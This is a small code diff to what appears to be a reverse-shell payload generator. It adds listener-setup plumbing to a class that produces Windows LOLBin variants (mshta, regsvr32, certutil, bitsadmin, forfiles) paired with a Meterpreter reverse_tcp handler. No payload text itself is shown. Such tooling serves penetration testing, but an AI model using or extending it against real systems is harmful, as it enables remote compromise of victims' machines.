@@ -1,7 +1,7 @@
 import base64
 import random
 import string
-from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler
+from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler, build_listener_setup
 
 _VARIANTS = ["mshta", "regsvr32", "certutil", "bitsadmin", "forfiles"]
 
@@ -47,6 +47,7 @@ class LOLBinsGenerator(ShellGenerator):
             listener=note,
             tty_upgrade=None,
             msf_compat=msf_handler("windows/meterpreter/reverse_tcp", opts.lhost, opts.lport),
+            listener_setup=build_listener_setup(opts.lhost, opts.lport),
         )
 
     def _mshta(self, url: str, obfuscate: bool) -> str:
